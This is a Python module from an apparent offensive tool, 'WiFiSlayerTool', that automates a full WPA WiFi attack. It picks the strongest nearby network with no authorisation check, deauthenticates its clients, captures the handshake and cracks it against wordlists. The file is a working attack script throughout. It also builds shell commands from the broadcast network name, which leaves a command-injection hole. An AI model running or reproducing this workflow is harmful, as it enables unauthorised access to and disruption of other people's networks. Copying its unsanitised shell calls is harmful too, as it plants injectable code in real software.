# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Auto-Pwn Module
Fully automated end-to-end WiFi exploitation workflow.
"""

import os
import subprocess
import time

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, confirm_action,
)
from core.validator import safe_input, validate_mac
from core.network import get_wireless_interfaces, enable_monitor_mode
from core.ascii_art import print_dragon_art
from config import get_text, HANDSHAKE_DIR, DEFAULT_WORDLISTS


def autopwn_menu(current_interface=None):
    """Auto-Pwn Mode Menu."""
    os.system("clear" if os.name != "nt" else "cls")
    print_dragon_art()
    
    print_section(get_text("menu_advanced"))
    
    print_warning(get_text("autopwn_steps"))
    print_warning(get_text("autopwn_step1"))
    print_warning(get_text("autopwn_step2"))
    print_warning(get_text("autopwn_step3"))
    print_warning(get_text("autopwn_step4"))
    print_warning(get_text("autopwn_step5"))
    print_warning(get_text("autopwn_step6"))
        
    console.print()

    if not confirm_action(get_text("autopwn_confirm")):
        return

    interfaces = get_wireless_interfaces()
    if not interfaces:
        print_error(get_text("no_interface"))
        return

    if not current_interface:
        print_info("Select interface to use for Auto-Pwn:")
        current_interface = select_interface(interfaces)
        if not current_interface:
            return

    # Ensure monitor mode
    print_info(f"{get_text('enabling_monitor')} [bold]{current_interface}[/]...")
    mon_iface = enable_monitor_mode(current_interface)
    if mon_iface:
        current_interface = mon_iface
    
    log.info(f"Auto-Pwn started on {current_interface}")

    # STEP 1: SCAN
    print_info(get_text("autopwn_scanning"))
    scan_file = "/tmp/autopwn_scan"
    os.system(f"sudo rm -f {scan_file}-01.csv 2>/dev/null")
    
    # Run airodump-ng in background for 15 seconds
    proc = subprocess.Popen(["sudo", "airodump-ng", "-w", scan_file, "--output-format", "csv", current_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    import rich.progress
    with rich.progress.Progress(transient=True) as progress:
        task = progress.add_task("[cyan]Scanning...", total=15)
        for _ in range(15):
            time.sleep(1)
            progress.advance(task)
            
    proc.terminate()
    proc.wait()

    # STEP 2: SELECT BEST TARGET
    csv_path = f"{scan_file}-01.csv"
    if not os.path.exists(csv_path):
        print_error(get_text("autopwn_scan_failed"))
        return

    # Parse CSV to find target with best signal (Power) that has WPA/WPA2
    best_target = None
    try:
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            for line in lines:
                if len(line) < 20 or "BSSID" in line or "Station MAC" in line:
                    continue
                if line.strip() == "":
                    break
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    channel = parts[3]
                    privacy = parts[5]
                    power = int(parts[8].strip()) if parts[8].strip().lstrip('-').isdigit() else -100
                    essid = parts[13]

                    if "WPA" in privacy and essid:
                        if not best_target or power > best_target['power']:
                            best_target = {'bssid': bssid, 'channel': channel, 'power': power, 'essid': essid}
    except Exception as e:
        log.error(f"Error parsing scan results: {e}")

    if not best_target:
        print_error(get_text("autopwn_no_targets"))
        return

    print_success(f"{get_text('autopwn_target_found')} [bold]{best_target['essid']}[/] ({best_target['bssid']}) on CH {best_target['channel']}")

    # STEP 3 & 4: DEAUTH & CAPTURE
    print_info(get_text("autopwn_capturing"))
    os.system(f"sudo iwconfig {current_interface} channel {best_target['channel']}")
    
    cap_file_prefix = os.path.join(HANDSHAKE_DIR, f"autopwn_{best_target['essid'].replace(' ', '_')}")
    os.system(f"sudo rm -f {cap_file_prefix}-01.cap 2>/dev/null")

    # Start airodump-ng
    airodump_proc = subprocess.Popen(["sudo", "airodump-ng", "-c", str(best_target['channel']), "--bssid", best_target['bssid'], "-w", cap_file_prefix, current_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(3)
    
    # Fire Deauth
    print_info(get_text("autopwn_sending_deauth"))
    os.system(f"sudo aireplay-ng --deauth 15 -a {best_target['bssid']} {current_interface} >/dev/null 2>&1")
    
    print_info(get_text("autopwn_waiting"))
    time.sleep(15)
    
    airodump_proc.terminate()
    airodump_proc.wait()

    # STEP 5: VALIDATE
    print_info(get_text("autopwn_validating"))
    cap_file = f"{cap_file_prefix}-01.cap"
    
    if not os.path.exists(cap_file):
        print_error(get_text("autopwn_failed_cap"))
        return

    result = subprocess.run(["aircrack-ng", cap_file], capture_output=True, text=True)
    if "1 handshake" not in result.stdout.lower() and "wpa (" not in result.stdout.lower():
        print_error(get_text("autopwn_invalid_cap"))
        return

    print_success(f"{get_text('autopwn_valid_cap')} {best_target['essid']}!")

    # STEP 6: CRACK
    print_info(get_text("autopwn_cracking"))
    cracked = False
    for wordlist in DEFAULT_WORDLISTS:
        if os.path.exists(wordlist):
            print_info(f"{get_text('cracking_with')} {os.path.basename(wordlist)}")
            result = os.system(f"sudo aircrack-ng '{cap_file}' -w '{wordlist}'")
            if result == 0:
                print_success(f"{get_text('autopwn_pwned')} {best_target['essid']}! 🔥")
                cracked = True
                break
    
    if not cracked:
        print_warning(f"{get_text('autopwn_saved')} ({cap_file})")
        
    log.info(f"Auto-Pwn finished for {best_target['essid']}")
